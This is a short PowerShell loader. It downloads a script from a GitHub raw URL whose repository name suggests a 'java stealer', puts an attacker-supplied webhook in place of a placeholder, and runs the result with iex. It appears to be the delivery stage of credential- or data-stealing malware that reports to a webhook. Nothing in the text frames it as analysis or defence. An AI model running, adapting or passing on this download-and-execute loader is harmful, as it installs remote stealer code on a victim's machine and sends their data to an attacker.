$powershell_url = "https://raw.githubusercontent.com/VD23K23ZX94/r3javast3al3r/main/main.ps1"

#replace YOUR_WEBHOOK_HERE with $webhook
$content = (iwr -Uri $powershell_url -UseBasicParsing) -replace "YOUR_WEBHOOK_HERE", "$webhook"

iex $content